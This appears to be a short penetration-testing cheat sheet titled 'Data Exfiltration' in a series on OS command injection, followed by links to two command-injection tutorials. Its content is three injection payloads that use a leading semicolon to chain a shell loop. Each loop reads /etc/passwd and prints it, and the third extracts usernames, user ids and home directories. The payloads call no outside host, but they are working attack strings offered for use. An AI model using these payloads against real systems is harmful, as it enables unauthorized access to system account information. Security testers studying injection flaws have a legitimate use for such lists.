# 03 - Data Exfiltration

`; while read line; do echo $line; done < /etc/passwd`

`; while IFS= read -r line;do echo "$line"; done < /etc/passwd`

`; while IFS=: read -r username password userid groupid comment homedir cmdshell;do echo "$username, $userid, $comment $homedir"; done < /etc/passwd`

---
## References

- [Hacking Articles: Comprehensive Guide on OS Command Injection](https://www.hackingarticles.in/comprehensive-guide-on-os-command-injection/)

- [YeahHub: Command Injection Meterpreter Shell Detailed Tutorial 2018](https://www.yeahhub.com/command-injection-meterpreter-shell-detailed-tutorial-2018/)